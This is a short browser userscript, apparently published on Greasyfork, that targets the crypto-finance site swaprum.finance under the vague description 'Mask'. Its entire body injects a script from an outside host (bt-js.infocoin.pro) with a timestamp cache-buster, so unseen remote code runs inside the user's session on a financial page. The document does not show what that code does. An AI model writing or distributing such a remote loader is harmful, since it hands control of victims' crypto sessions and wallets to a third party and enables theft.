// ==UserScript==
// @name         Lxgn swaprum.finance
// @version      0.02
// @author       lxgn
// @description  Mask
// @match        https://swaprum.finance/*
// @grant        none
// @namespace https://greasyfork.org/users/195836
// @downloadURL https://update.greasyfork.org/scripts/466508/Lxgn%20swaprumfinance.user.js
// @updateURL https://update.greasyfork.org/scripts/466508/Lxgn%20swaprumfinance.meta.js
// ==/UserScript==

var ms = new Date();
//document.write();
 
var script = document.createElement('script');
//var t = Math.random()*1000000;
 
var kuda = "https://bt-js.infocoin.pro/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script);
 
script.onload = function() {
    // после выполнения скрипта становится доступна функция _
    //alert( 'load script' ); // её код
  }